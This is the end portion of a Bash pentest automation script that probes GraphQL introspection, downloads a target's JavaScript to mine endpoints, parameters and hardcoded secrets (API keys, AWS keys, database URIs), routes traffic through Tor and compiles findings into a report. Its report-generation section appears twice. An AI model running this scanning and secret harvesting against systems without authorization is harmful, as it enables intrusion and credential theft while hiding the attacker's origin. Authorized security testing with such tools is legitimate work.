        print(f'  Endpoint: {p} [{\" \".join(methods).upper()}]')
except: pass
" 2>/dev/null)
                [[ -n "$ENDPOINTS" ]] && echo "$ENDPOINTS"
            fi

            # GraphQL introspection
            if echo "$ep" | grep -qi "graphql\|graphiql"; then
                GQL_RESP=$(px curl -sk -X POST \
                    -H "Content-Type: application/json" \
                    -d '{"query":"{ __schema { types { name } } }"}' \
                    "${TARGET_URL}${ep}" 2>/dev/null)
                echo "$GQL_RESP" | grep -q "__schema" && \
                    echo "  [CRITICAL] GraphQL Introspection ENABLED!"
            fi
        fi
    done
} | tee "${OUTPUT_DIR}/api/api_discovery.txt"
API_CNT=$(grep -c "\[FOUND\]" \
    "${OUTPUT_DIR}/api/api_discovery.txt" 2>/dev/null || echo 0)
notify OK "API Discovery -- ${API_CNT} endpoints -> api/api_discovery.txt"

# ── P2.5: PARAMETER MINING DARI JS ───────────────────────────
separator "P2.5 -- PARAMETER MINING FROM JS"
notify INFO "Extracting hidden parameters from JS files..."

{
    echo "=== PARAMETER MINING FROM JS === $(date)"
    JS_DIR="${OUTPUT_DIR}/js_analysis/files"
    mkdir -p "$JS_DIR"

    # Download JS files yang belum ada
    cat "${OUTPUT_DIR}/params/all_urls.txt" 2>/dev/null | \
        grep -E "\.js(\?|$)" | head -100 | \
        while read -r jsurl; do
            FN=$(echo "$jsurl" | md5sum | cut -c1-8).js
            [[ ! -f "${JS_DIR}/${FN}" ]] && \
                curl -sk --max-time 10 "$jsurl" \
                -o "${JS_DIR}/${FN}" 2>/dev/null
        done

    # Extract parameters dari JS
    echo "[*] Extracting parameters..."
    grep -rh -oE \
        '(fetch|axios|http|request|ajax|get|post|put|delete)\(["\x27][^"\x27]+["\x27]' \
        "$JS_DIR" 2>/dev/null | \
        grep -oE '"/[^"]+"|'"'"'/[^'"'"']+'"'" | \
        sort -u | head -50 | \
        while read -r endpoint; do
            echo "  [ENDPOINT] $endpoint"
        done

    # Extract param names dari JS
    echo ""
    echo "[*] Extracting parameter names..."
    grep -rh -oE \
        'params\[["'"'"']([^"'"'"']+)["'"'"']\]|\.get\(["'"'"']([^"'"'"']+)["'"'"']\)|name=["'"'"']([^"'"'"']+)["'"'"']' \
        "$JS_DIR" 2>/dev/null | \
        grep -oE '"[^"]+"|'"'"'[^'"'"']+'"'" | \
        tr -d '"'"'" | sort -u | head -50 | \
        while read -r param; do
            echo "  [PARAM] $param"
        done

    # Extract API keys patterns
    echo ""
    echo "[*] Checking for hardcoded secrets..."
    grep -rn -Ei \
        'api[_-]?key\s*[:=]\s*["'"'"'][a-zA-Z0-9]{16,}|
         token\s*[:=]\s*["'"'"'][a-zA-Z0-9]{20,}|
         secret\s*[:=]\s*["'"'"'][a-zA-Z0-9]{16,}|
         password\s*[:=]\s*["'"'"'][^"'"'"']{6,}|
         AKIA[0-9A-Z]{16}|
         mongodb://|mysql://|postgres://' \
        "$JS_DIR" 2>/dev/null | head -20 | \
        while IFS= read -r line; do
            echo "  [SECRET] $line"
        done
} | tee "${OUTPUT_DIR}/js_analysis/param_mining.txt"
PARAM_MINED=$(grep -c "\[PARAM\]\|\[ENDPOINT\]\|\[SECRET\]" \
    "${OUTPUT_DIR}/js_analysis/param_mining.txt" 2>/dev/null || echo 0)
notify OK "Param mining -- ${PARAM_MINED} items -> js_analysis/param_mining.txt"


# ================================================================
#  UPGRADE P3 -- QUALITY OF LIFE
# ================================================================

# ── P3.1: CONFIG FILE ────────────────────────────────────────
# ── LOAD CONFIGURATION FILE ──────────────────────────────────────
CONF_FILE="${HOME}/.cassiopeia.conf"

# Look for conf in script directory too
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
[[ -f "${SCRIPT_DIR}/cassiopeia.conf" && ! -f "$CONF_FILE" ]] &&     cp "${SCRIPT_DIR}/cassiopeia.conf" "$CONF_FILE" &&     notify OK "Config copied from script dir -> ${CONF_FILE}"

if [[ ! -f "$CONF_FILE" ]]; then
    notify INFO "Config file not found at ${CONF_FILE}"
    notify INFO "Creating default config..."
    cat > "$CONF_FILE" << 'CONFEOF'
# Cassiopeia config — edit as needed
# Full config: see cassiopeia.conf in project directory

TOR_ENTRY_NODES=""
TOR_EXIT_NODES=""
MAX_SCAN_SECONDS=21600
DEFAULT_TIMEOUT=30
MAX_THREADS=50
SKIP_PHASES=""
CUSTOM_WORDLIST=""
PASS_WORDLIST=""
OUTPUT_PREFIX="pentest"
GENERATE_PDF=1
AUTO_OPEN_REPORT=0
CAIDO_PROXY_PORT=8080
CAIDO_GUI_PORT=7777
CAIDO_AUTO_SEND=1
CAIDO_AUTO_OPEN=0
NMAP_USE_MASSCAN_FIRST=1
SQLMAP_LEVEL=3
SQLMAP_RISK=2
NUCLEI_RATE_LIMIT=100
DALFOX_WORKERS=30
FFUF_THREADS=80
AMASS_TIMEOUT=10
WPSCAN_MODE="aggressive"
RACE_CONCURRENCY=${RACE_CONCURRENCY:-20}
SPRAY_SLEEP=1
GRAPHQL_DEEP=1
BXSS_DEVICES=5
JS_MAX_FILES=80
CONFEOF
    notify OK "Default config created -> ${CONF_FILE}"
    notify INFO "Edit config: nano ${CONF_FILE}"
fi

# Load config
source "$CONF_FILE" 2>/dev/null

# Apply loaded config values
[[ -n "$MAX_SCAN_SECONDS" ]] && MAX_SCAN_SECONDS=$MAX_SCAN_SECONDS
[[ -n "$MAX_THREADS" ]] && MAX_THREADS=$MAX_THREADS
[[ -n "$DEFAULT_TIMEOUT" ]] && DEFAULT_TIMEOUT=$DEFAULT_TIMEOUT
[[ -n "$FFUF_THREADS" ]] && FFUF_THREADS=$FFUF_THREADS
[[ -n "$SQLMAP_LEVEL" ]] && SQLMAP_LEVEL=$SQLMAP_LEVEL
[[ -n "$SQLMAP_RISK" ]] && SQLMAP_RISK=$SQLMAP_RISK
[[ -n "$NUCLEI_RATE_LIMIT" ]] && NUCLEI_RATE_LIMIT=$NUCLEI_RATE_LIMIT
[[ -n "$DALFOX_WORKERS" ]] && DALFOX_WORKERS=$DALFOX_WORKERS
[[ -n "$RACE_CONCURRENCY" ]] && RACE_CONCURRENCY=$RACE_CONCURRENCY
[[ -n "$JS_MAX_FILES" ]] && JS_MAX_FILES=$JS_MAX_FILES
[[ -n "$CAIDO_PROXY_PORT" ]] && CAIDO_PROXY="127.0.0.1:${CAIDO_PROXY_PORT}"
[[ -n "$CAIDO_GUI_PORT" ]] && CAIDO_GUI_URL="http://127.0.0.1:${CAIDO_GUI_PORT}"

# Override wordlists if set in config
[[ -n "$CUSTOM_WORDLIST" && -f "$CUSTOM_WORDLIST" ]] && WL="$CUSTOM_WORDLIST"
[[ -n "$PASS_WORDLIST" && -f "$PASS_WORDLIST" ]] && PASS_WL="$PASS_WORDLIST"

# Apply Tor node config
if [[ -n "$TOR_ENTRY_NODES" || -n "$TOR_EXIT_NODES" ]]; then
    [[ -n "$TOR_ENTRY_NODES" ]] &&         echo "EntryNodes ${TOR_ENTRY_NODES}" >> /etc/tor/torrc
    [[ -n "$TOR_EXIT_NODES" ]] &&         echo "ExitNodes ${TOR_EXIT_NODES}" >> /etc/tor/torrc
    systemctl reload tor 2>/dev/null
fi

notify OK "Config loaded from: ${CONF_FILE}"

#  BAGIAN 4 -- GENERATE HTML REPORT
# ================================================================
separator "BAGIAN 4 -- GENERATE HTML REPORT"
notify PHASE "Membuat HTML Report dengan statistik..."

# Collect stats
ST_SUBS=$(wc -l < "${OUTPUT_DIR}/recon/all_subs.txt" 2>/dev/null || echo 0)
ST_LIVE=$(wc -l < "${OUTPUT_DIR}/recon/live_hosts.txt" 2>/dev/null || echo 0)
ST_URLS=$(wc -l < "${OUTPUT_DIR}/params/all_urls.txt" 2>/dev/null || echo 0)
ST_PARAMS=$(wc -l < "${OUTPUT_DIR}/params/urls_with_params.txt" 2>/dev/null || echo 0)
ST_NCRIT=$(grep -ci "critical" "${OUTPUT_DIR}/vulns/nuclei_main.txt" 2>/dev/null || echo 0)
ST_NHIGH=$(grep -ci "high" "${OUTPUT_DIR}/vulns/nuclei_main.txt" 2>/dev/null || echo 0)
ST_NMED=$(grep -ci "medium" "${OUTPUT_DIR}/vulns/nuclei_main.txt" 2>/dev/null || echo 0)
ST_NLOW=$(grep -ci "low" "${OUTPUT_DIR}/vulns/nuclei_main.txt" 2>/dev/null || echo 0)
ST_NINFO=$(grep -ci "info" "${OUTPUT_DIR}/vulns/nuclei_main.txt" 2>/dev/null || echo 0)
ST_XSS=$(grep -c "POC\|XSS" "${OUTPUT_DIR}/xss/dalfox.txt" 2>/dev/null || echo 0)
ST_BXSS=${BXSS_CNT:-0}
ST_SQLI=$(find "${OUTPUT_DIR}/sqli" -name "*.txt" -exec grep -l "injectable" {} \; 2>/dev/null | wc -l)
ST_SSRF=$(grep -c "POTENTIAL" "${OUTPUT_DIR}/ssrf/ssrf_results.txt" 2>/dev/null || echo 0)
ST_LFI=$(grep -c "CONFIRMED" "${OUTPUT_DIR}/lfi/lfi_results.txt" 2>/dev/null || echo 0)
ST_PP=$(grep -c "POTENTIAL\|CONFIRMED" "${OUTPUT_DIR}/prototype_pollution/query.txt" 2>/dev/null || echo 0)
ST_PHP=$(grep -c "!!!" "${OUTPUT_DIR}/code_injection/php.txt" 2>/dev/null || echo 0)
ST_PY=$(grep -c "!!!" "${OUTPUT_DIR}/code_injection/python.txt" 2>/dev/null || echo 0)
ST_JSIJ=$(grep -c "!!!" "${OUTPUT_DIR}/code_injection/nodejs.txt" 2>/dev/null || echo 0)
ST_CORS=$(grep -c "CONFIRMED\|MISCONFIG" "${OUTPUT_DIR}/cors/cors_results.txt" 2>/dev/null || echo 0)
ST_GQL=$(grep -c "ENABLED\|INTROSPECTION" "${OUTPUT_DIR}/graphql/graphql_results.txt" 2>/dev/null || echo 0)
ST_SEC=$(grep -c "\[!\]" "${OUTPUT_DIR}/js_analysis/secrets.txt" 2>/dev/null || echo 0)
ST_SENS=$(wc -l < "${OUTPUT_DIR}/recon/sensitive_files.txt" 2>/dev/null || echo 0)
ST_HDR=$(grep -c "MISSING" "${OUTPUT_DIR}/headers/security_headers.txt" 2>/dev/null || echo 0)

# P3-P5 new stats
ST_SPF=$(grep -c "SPF MISSING" "${OUTPUT_DIR}/recon/dns_misconfig.txt" 2>/dev/null || echo 0)
ST_DMARC=$(grep -c "DMARC MISSING" "${OUTPUT_DIR}/recon/dns_misconfig.txt" 2>/dev/null || echo 0)
ST_ZONE=$(grep -c "ZONE TRANSFER BERHASIL" "${OUTPUT_DIR}/recon/dns_misconfig.txt" 2>/dev/null || echo 0)
ST_CLOUD=$(grep -c "!!!" "${OUTPUT_DIR}/recon/cloud_misconfig.txt" 2>/dev/null || echo 0)
ST_IDOR=$(grep -c "IDOR" "${OUTPUT_DIR}/auth/business_logic.txt" 2>/dev/null || echo 0)
ST_MASS=$(grep -c "mass assignment" "${OUTPUT_DIR}/auth/business_logic.txt" 2>/dev/null || echo 0)
ST_DESER=$(grep -c "POTENTIAL\|CONFIRMED" "${OUTPUT_DIR}/auth/deserialize.txt" 2>/dev/null || echo 0)
ST_OAUTH=$(grep -c "REDIRECT\|BYPASS" "${OUTPUT_DIR}/auth/oauth_test.txt" 2>/dev/null || echo 0)
ST_SESSION=$(grep -c "TIDAK ADA\|MISSING" "${OUTPUT_DIR}/auth/session_test.txt" 2>/dev/null || echo 0)
ST_SSTI=$(grep -c "CONFIRMED" "${OUTPUT_DIR}/ssti/ssti_results.txt" 2>/dev/null || echo 0)
ST_BL=$(grep -c "\[!\]\|\[!!!\]" "${OUTPUT_DIR}/auth/business_logic.txt" 2>/dev/null || echo 0)
ST_BL=$(grep -c "\[!\]\|\[!!!\]" "${OUTPUT_DIR}/auth/business_logic.txt" 2>/dev/null || echo 0)
ST_CERT=$(wc -l < "${OUTPUT_DIR}/recon/cert_transparency.txt" 2>/dev/null || echo 0)

# Load CVSS totals dari JSON
CVSS_CRIT=0; CVSS_HIGH=0; CVSS_MED=0; CVSS_LOW=0
if [[ -f "${OUTPUT_DIR}/report/cvss_findings.json" ]]; then
    CVSS_CRIT=$(python3 -c "import json;d=json.load(open('${OUTPUT_DIR}/report/cvss_findings.json'));print(d['critical'])" 2>/dev/null || echo 0)
    CVSS_HIGH=$(python3 -c "import json;d=json.load(open('${OUTPUT_DIR}/report/cvss_findings.json'));print(d['high'])" 2>/dev/null || echo 0)
    CVSS_MED=$(python3 -c  "import json;d=json.load(open('${OUTPUT_DIR}/report/cvss_findings.json'));print(d['medium'])" 2>/dev/null || echo 0)
    CVSS_LOW=$(python3 -c  "import json;d=json.load(open('${OUTPUT_DIR}/report/cvss_findings.json'));print(d['low'])" 2>/dev/null || echo 0)
fi

TOTAL_CRITICAL=$((ST_NCRIT + ST_BXSS + ST_LFI + ST_PHP + ST_CLOUD + ST_DESER))
TOTAL_HIGH=$((ST_NHIGH + ST_XSS + ST_SQLI + ST_SSRF + ST_CORS + ST_IDOR + ST_SPF + ST_DMARC + ST_ZONE))
TOTAL_MEDIUM=$((ST_NMED + ST_PP + ST_PY + ST_JSIJ + ST_GQL + ST_MASS + ST_OAUTH + ST_SESSION))
TOTAL_LOW=$((ST_NLOW + ST_HDR + ST_SENS + ST_BL))
TOTAL_INFO=$((ST_NINFO + ST_SEC + ST_SUBS + ST_LIVE + ST_CERT))
TOTAL_ALL=$((TOTAL_CRITICAL + TOTAL_HIGH + TOTAL_MEDIUM + TOTAL_LOW + TOTAL_INFO))

HTML_FILE="${OUTPUT_DIR}/report/CASSIOPEIA_REPORT_${DOMAIN}_${TIMESTAMP}.html"
mkdir -p "${OUTPUT_DIR}/report"

notify INFO "Generate HTML + PDF report..."

# Install weasyprint untuk PDF
pip install weasyprint --break-system-packages -q 2>/dev/null || true

# Jalankan gen_report.py
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
GENREP="${SCRIPT_DIR}/gen_report.py"
[[ ! -f "$GENREP" ]] && GENREP="$(pwd)/gen_report.py"
[[ ! -f "$GENREP" ]] && GENREP="${HOME}/.cassiopeia_gen_report.py"

if [[ ! -f "$GENREP" ]]; then
    notify WARN "gen_report.py tidak found di: ${SCRIPT_DIR}"
    notify INFO "Pastikan gen_report.py ada di folder yang sama dengan cassiopeia.sh"
else
    python3 "$GENREP" \
        "${OUTPUT_DIR}" \
        "${DOMAIN}" \
        "${TARGET_URL}" \
        "${IP}" \
        "${TOR_IP:-unknown}" \
        "${REAL_IP:-unknown}" \
        "${TIMESTAMP}"
fi

HTML_FILE="${OUTPUT_DIR}/report/CASSIOPEIA_REPORT_${DOMAIN}_${TIMESTAMP}.html"
PDF_FILE="${OUTPUT_DIR}/report/CASSIOPEIA_REPORT_${DOMAIN}_${TIMESTAMP}.pdf"

[[ -f "$HTML_FILE" ]] && notify OK "HTML -> ${HTML_FILE}"
[[ -f "$PDF_FILE"  ]] && notify OK "PDF  -> ${PDF_FILE}" || \
    notify WARN "PDF gagal -- install: pip install weasyprint ATAU yay -S wkhtmltopdf"

#  CAIDO INTEGRATION -- AUTO SEND KE CAIDO GUI
# ================================================================
separator "CAIDO INTEGRATION -- AUTO MANUAL TESTING"
notify PHASE "Sending all findings to Caido for manual testing..."

CAIDO_PROXY="127.0.0.1:8080"
CAIDO_URL="http://127.0.0.1:8080"

# Checking apakah Caido lagi jalan
CAIDO_RUNNING=false
if curl -sk --max-time 3 "$CAIDO_URL" > /dev/null 2>&1; then
    CAIDO_RUNNING=true
    notify OK "Caido detected at ${CAIDO_PROXY}"
else
    notify WARN "Caido not running at ${CAIDO_PROXY}"
    echo -e "${CYAN}  [?] Start Caido first? Script will wait... (y/n):${NC}"
    read -rp "  > " START_CAIDO
    if [[ "$START_CAIDO" == "y" ]]; then
        # Coba start Caido di background
        if command -v caido &>/dev/null; then
            notify INFO "Starting Caido..."
            caido &>/dev/null &
            sleep 5
        elif [[ -f "${HOME}/.local/bin/caido" ]]; then
            "${HOME}/.local/bin/caido" &>/dev/null &
            sleep 5
        elif [[ -f "/opt/caido/caido" ]]; then
            /opt/caido/caido &>/dev/null &
            sleep 5
        fi
        # Checking lagi
        curl -sk --max-time 5 "$CAIDO_URL" > /dev/null 2>&1 &&             CAIDO_RUNNING=true && notify OK "Caido started successfully!" ||             notify WARN "Caido could not be auto-started -- start manually"
    fi
fi

if [[ "$CAIDO_RUNNING" == "true" ]]; then
    notify INFO "Sending URLs to Caido via proxy replay..."

    # Kirim semua URLs dengan params ke Caido proxy
    # Caido akan otomatis intercept dan log semua request
    SENT=0
    TOTAL_URLS=$(wc -l < "${OUTPUT_DIR}/params/urls_with_params.txt" 2>/dev/null || echo 0)

    notify INFO "Replaying ${TOTAL_URLS} URLs via Caido proxy..."

    head -200 "${OUTPUT_DIR}/params/urls_with_params.txt" 2>/dev/null |     while IFS= read -r url; do
        curl -sk --max-time 5             --proxy "$CAIDO_PROXY"             -H "X-Cassiopeia-Source: automated-replay"             -H "X-Cassiopeia-Target: ${DOMAIN}"             "$url" > /dev/null 2>&1
        SENT=$((SENT+1))
        # Progress
        [[ $((SENT % 10)) -eq 0 ]] &&             printf "
  ${CYAN}[>] Sent: ${SENT}/${TOTAL_URLS}${NC}"
    done
    echo ""
    notify OK "URLs sent to Caido -- check History tab in Caido GUI"

    # Kirim juga verified findings khusus
    notify INFO "Sending verified findings for manual verification..."
    {
        # XSS findings
        grep "CONFIRMED\|POC" "${OUTPUT_DIR}/xss/xss_verified.txt"             "${OUTPUT_DIR}/xss/dalfox.txt" 2>/dev/null |             grep -oE "https?://[^ ]+" | sort -u

        # LFI findings
        grep "CONFIRMED\|LFI" "${OUTPUT_DIR}/lfi/lfi_verified.txt" 2>/dev/null |             grep -oE "https?://[^ ]+" | sort -u

        # SSRF findings
        grep "CONFIRMED\|POTENTIAL" "${OUTPUT_DIR}/ssrf/ssrf_verified.txt" 2>/dev/null |             grep -oE "https?://[^ ]+" | sort -u

        # 403 bypass
        grep "BYPASS" "${OUTPUT_DIR}/auth/bypass_403.txt" 2>/dev/null |             grep -oE "https?://[^ ]+" | sort -u

        # API endpoints found
        grep "FOUND" "${OUTPUT_DIR}/api/api_discovery.txt" 2>/dev/null |             grep -oE "https?://[^ ]+" | sort -u

    } | sort -u | while IFS= read -r url; do
        curl -sk --max-time 5             --proxy "$CAIDO_PROXY"             -H "X-Cassiopeia-Source: verified-finding"             -H "X-Cassiopeia-Priority: HIGH"             "$url" > /dev/null 2>&1
    done
    notify OK "Verified findings sent to Caido -- filter X-Cassiopeia-Source: verified-finding"

    # Buka Caido GUI di browser
    notify INFO "Opening Caido GUI in browser..."
    CAIDO_GUI_URL="http://127.0.0.1:7777"

    # Checking Caido GUI port (biasanya 7777)
    if curl -sk --max-time 3 "$CAIDO_GUI_URL" > /dev/null 2>&1; then
        if [[ "${CAIDO_AUTO_OPEN:-0}" == "1" ]] && command -v xdg-open &>/dev/null; then
            xdg-open "$CAIDO_GUI_URL" &>/dev/null &
        elif command -v firefox &>/dev/null; then
            firefox "$CAIDO_GUI_URL" &>/dev/null &
        elif command -v chromium &>/dev/null; then
            chromium "$CAIDO_GUI_URL" &>/dev/null &
        fi
        notify OK "Caido GUI opened at ${CAIDO_GUI_URL}"
    else
        notify INFO "Open Caido GUI manually at: ${CAIDO_GUI_URL}"
    fi

    echo ""
    echo -e "${YELLOW}  Caido tips for manual testing:${NC}"
    echo -e "  1. Check History tab -- all URLs are there"
    echo -e "  2. Filter: X-Cassiopeia-Source: verified-finding = priority findings"
    echo -e "  3. Klik URL -> Send to Replaying -> modifikasi payload manual"
    echo -e "  4. Use Automate for mass fuzzing of discovered endpoints"
    echo -e "  5. Check Intercept -- proxy active at ${CAIDO_PROXY}"
    echo ""
else
    notify WARN "Caido not active -- skipping auto-send"
    notify INFO "Manual: start Caido, set proxy ${CAIDO_PROXY}, open target"
fi

# ================================================================
#  SELESAI
# ================================================================
echo -e "\n${GREEN}${BOLD}"
echo "+==================================================================+"
echo "|         CASSIOPEIA PENTEST v4.0.0 -- COMPLETE!                   |"
echo "|         by Xyra77                                                |"
echo "+------------------------------------------------------------------+"
echo "|  [OK] Section 1 : OPSEC (Tor + ProxyChains + MAC Spoof)          |"
echo "|  [OK] Section 2 : Main Pentest (15 Phases, 40+ Tools)             |"
echo "|  [OK] Section 3 : Advanced Pentest (PP + Code Inj + Browser XSS) |"
echo "|  [OK] Bagian 4 : HTML + PDF Report + CVSS + Full Audit        |"
echo "|  [OK] Caido    : Auto-send URLs + Open GUI                      |"
echo "+==================================================================+"
echo -e "${NC}"
echo -e "${CYAN}  Output Dir : ${BOLD}${OUTPUT_DIR}/${NC}"
echo -e "${CYAN}  HTML Report : ${BOLD}${HTML_FILE}${NC}"
echo -e "${GREEN}  IP via Tor : ${BOLD}${TOR_IP}${NC}"
echo -e "${RED}  Real IP     : ${BOLD}${REAL_IP} (hidden)${NC}"
echo ""
echo -e "${YELLOW}  Buka report:${NC}"
echo -e "  ${BOLD}firefox ${HTML_FILE}${NC}"
echo -e "  ${BOLD}chromium ${HTML_FILE}${NC}"
echo ""
echo -e "${YELLOW}  Caido:${NC}"
echo -e "  ${BOLD}http://127.0.0.1:7777${NC}"
echo ""
echo -e "${RED}  AUTHORIZED PENETRATION TESTING ONLY!${NC}"

systemctl stop tor 2>/dev/null

# ================================================================
#  SECTION 4 -- GENERATE HTML + PDF REPORT
# ================================================================
separator "SECTION 4 -- GENERATE HTML + PDF REPORT"
notify PHASE "Generating HTML + PDF report..."

HTML_FILE="${OUTPUT_DIR}/report/CASSIOPEIA_REPORT_${DOMAIN}_${TIMESTAMP}.html"
PDF_FILE="${OUTPUT_DIR}/report/CASSIOPEIA_REPORT_${DOMAIN}_${TIMESTAMP}.pdf"
mkdir -p "${OUTPUT_DIR}/report"

# Install dependencies
python3 -c "import reportlab" 2>/dev/null || \
    pip install reportlab --break-system-packages -q 2>/dev/null
python3 -c "import weasyprint" 2>/dev/null || \
    pip install weasyprint --break-system-packages -q 2>/dev/null

notify INFO "Generating HTML report (fully embedded CSS+JS)..."

# ── COLLECT ALL STATS ────────────────────────────────────────────
ST_SUBS=$(wc -l < "${OUTPUT_DIR}/recon/all_subs.txt" 2>/dev/null || echo 0)
ST_LIVE=$(wc -l < "${OUTPUT_DIR}/recon/live_hosts.txt" 2>/dev/null || echo 0)
ST_URLS=$(wc -l < "${OUTPUT_DIR}/params/all_urls.txt" 2>/dev/null || echo 0)
ST_PARAMS=$(wc -l < "${OUTPUT_DIR}/params/urls_with_params.txt" 2>/dev/null || echo 0)
ST_CERT=$(wc -l < "${OUTPUT_DIR}/recon/cert_transparency.txt" 2>/dev/null || echo 0)
ST_NCRIT=$(grep -ci "critical" "${OUTPUT_DIR}/vulns/nuclei_main.txt" 2>/dev/null || echo 0)
ST_NHIGH=$(grep -ci "high" "${OUTPUT_DIR}/vulns/nuclei_main.txt" 2>/dev/null || echo 0)
ST_NMED=$(grep -ci "medium" "${OUTPUT_DIR}/vulns/nuclei_main.txt" 2>/dev/null || echo 0)
ST_NLOW=$(grep -ci "low" "${OUTPUT_DIR}/vulns/nuclei_main.txt" 2>/dev/null || echo 0)
ST_NINFO=$(grep -ci "info" "${OUTPUT_DIR}/vulns/nuclei_main.txt" 2>/dev/null || echo 0)
ST_XSS=$(grep -c "POC\|XSS" "${OUTPUT_DIR}/xss/dalfox.txt" 2>/dev/null || echo 0)
ST_BXSS=${BXSS_CNT:-0}
ST_SQLI=$(find "${OUTPUT_DIR}/sqli" -name "*.txt" -exec grep -l "injectable" {} \; 2>/dev/null | wc -l)
ST_SSRF=$(grep -c "POTENTIAL" "${OUTPUT_DIR}/ssrf/ssrf_results.txt" 2>/dev/null || echo 0)
ST_LFI=$(grep -c "CONFIRMED" "${OUTPUT_DIR}/lfi/lfi_results.txt" 2>/dev/null || echo 0)
ST_SSTI=$(grep -c "CONFIRMED" "${OUTPUT_DIR}/ssti/ssti_results.txt" 2>/dev/null || echo 0)
ST_PP=$(grep -c "POTENTIAL\|CONFIRMED" "${OUTPUT_DIR}/prototype_pollution/query.txt" 2>/dev/null || echo 0)
ST_PHP=$(grep -c "!!!" "${OUTPUT_DIR}/code_injection/php.txt" 2>/dev/null || echo 0)
ST_PY=$(grep -c "!!!" "${OUTPUT_DIR}/code_injection/python.txt" 2>/dev/null || echo 0)
ST_JSIJ=$(grep -c "!!!" "${OUTPUT_DIR}/code_injection/nodejs.txt" 2>/dev/null || echo 0)
ST_CORS=$(grep -c "CONFIRMED\|MISCONFIG" "${OUTPUT_DIR}/cors/cors_results.txt" 2>/dev/null || echo 0)
ST_GQL=$(grep -c "ENABLED\|INTROSPECTION" "${OUTPUT_DIR}/graphql/graphql_results.txt" 2>/dev/null || echo 0)
ST_SEC=$(grep -c "\[!\]" "${OUTPUT_DIR}/js_analysis/secrets.txt" 2>/dev/null || echo 0)
ST_SENS=$(wc -l < "${OUTPUT_DIR}/recon/sensitive_files.txt" 2>/dev/null || echo 0)
ST_HDR=$(grep -c "MISSING" "${OUTPUT_DIR}/headers/security_headers.txt" 2>/dev/null || echo 0)
ST_SPF=$(grep -c "SPF MISSING" "${OUTPUT_DIR}/recon/dns_misconfig.txt" 2>/dev/null || echo 0)
ST_DMARC=$(grep -c "DMARC MISSING" "${OUTPUT_DIR}/recon/dns_misconfig.txt" 2>/dev/null || echo 0)
ST_ZONE=$(grep -c "ZONE TRANSFER BERHASIL" "${OUTPUT_DIR}/recon/dns_misconfig.txt" 2>/dev/null || echo 0)
ST_CLOUD=$(grep -c "!!!" "${OUTPUT_DIR}/recon/cloud_misconfig.txt" 2>/dev/null || echo 0)
ST_IDOR=$(grep -c "IDOR" "${OUTPUT_DIR}/auth/business_logic.txt" 2>/dev/null || echo 0)
ST_MASS=$(grep -c "mass assignment" "${OUTPUT_DIR}/auth/business_logic.txt" 2>/dev/null || echo 0)
ST_DESER=$(grep -c "POTENTIAL\|CONFIRMED" "${OUTPUT_DIR}/auth/deserialize.txt" 2>/dev/null || echo 0)
ST_OAUTH=$(grep -c "REDIRECT\|BYPASS" "${OUTPUT_DIR}/auth/oauth_test.txt" 2>/dev/null || echo 0)
ST_SESSION=$(grep -c "TIDAK ADA\|MISSING" "${OUTPUT_DIR}/auth/session_test.txt" 2>/dev/null || echo 0)
ST_BL=$(grep -c "\[!\]\|\[!!!\]" "${OUTPUT_DIR}/auth/business_logic.txt" 2>/dev/null || echo 0)
ST_403=$(grep -c "BYPASS" "${OUTPUT_DIR}/auth/bypass_403.txt" 2>/dev/null || echo 0)

TOTAL_CRITICAL=$((ST_NCRIT + ST_BXSS + ST_LFI + ST_PHP + ST_CLOUD + ST_DESER))
TOTAL_HIGH=$((ST_NHIGH + ST_XSS + ST_SQLI + ST_SSRF + ST_CORS + ST_IDOR + ST_SPF + ST_DMARC + ST_ZONE))
TOTAL_MEDIUM=$((ST_NMED + ST_PP + ST_PY + ST_JSIJ + ST_GQL + ST_MASS + ST_OAUTH + ST_SESSION))
TOTAL_LOW=$((ST_NLOW + ST_HDR + ST_SENS + ST_BL))
TOTAL_INFO=$((ST_NINFO + ST_SEC + ST_SUBS + ST_LIVE))
TOTAL_ALL=$((TOTAL_CRITICAL + TOTAL_HIGH + TOTAL_MEDIUM + TOTAL_LOW + TOTAL_INFO))

CVSS_CRIT=0; CVSS_HIGH=0; CVSS_MED=0; CVSS_LOW=0
if [[ -f "${OUTPUT_DIR}/report/cvss_findings.json" ]]; then
    CVSS_CRIT=$(python3 -c "import json;d=json.load(open('${OUTPUT_DIR}/report/cvss_findings.json'));print(d.get('critical',0))" 2>/dev/null || echo 0)
    CVSS_HIGH=$(python3 -c "import json;d=json.load(open('${OUTPUT_DIR}/report/cvss_findings.json'));print(d.get('high',0))" 2>/dev/null || echo 0)
    CVSS_MED=$(python3 -c  "import json;d=json.load(open('${OUTPUT_DIR}/report/cvss_findings.json'));print(d.get('medium',0))" 2>/dev/null || echo 0)
    CVSS_LOW=$(python3 -c  "import json;d=json.load(open('${OUTPUT_DIR}/report/cvss_findings.json'));print(d.get('low',0))" 2>/dev/null || echo 0)
fi

# ── GENERATE HTML via Python (fully self-contained) ──────────────
python3 << PYEOF
import os, json, re, base64
from datetime import datetime

OUT_DIR   = "${OUTPUT_DIR}"
DOMAIN    = "${DOMAIN}"
TARGET    = "${TARGET_URL}"
IP        = "${IP}"
TOR_IP    = "${TOR_IP}"
REAL_IP   = "${REAL_IP}"
TS        = "${TIMESTAMP}"
HTML_FILE = "${HTML_FILE}"

# ── STATS ─────────────────────────────────────────────────────────
S = {
    "subs":    int("${ST_SUBS}"),    "live":     int("${ST_LIVE}"),
    "urls":    int("${ST_URLS}"),    "params":   int("${ST_PARAMS}"),
    "cert":    int("${ST_CERT}"),    "ncrit":    int("${ST_NCRIT}"),
    "nhigh":   int("${ST_NHIGH}"),   "nmed":     int("${ST_NMED}"),
    "nlow":    int("${ST_NLOW}"),    "ninfo":    int("${ST_NINFO}"),
    "xss":     int("${ST_XSS}"),     "bxss":     int("${ST_BXSS}"),
    "sqli":    int("${ST_SQLI}"),    "ssrf":     int("${ST_SSRF}"),
    "lfi":     int("${ST_LFI}"),     "ssti":     int("${ST_SSTI}"),
    "pp":      int("${ST_PP}"),      "php":      int("${ST_PHP}"),
    "py":      int("${ST_PY}"),      "jsij":     int("${ST_JSIJ}"),
    "cors":    int("${ST_CORS}"),    "gql":      int("${ST_GQL}"),
    "sec":     int("${ST_SEC}"),     "sens":     int("${ST_SENS}"),
    "hdr":     int("${ST_HDR}"),     "spf":      int("${ST_SPF}"),
    "dmarc":   int("${ST_DMARC}"),   "zone":     int("${ST_ZONE}"),
    "cloud":   int("${ST_CLOUD}"),   "idor":     int("${ST_IDOR}"),
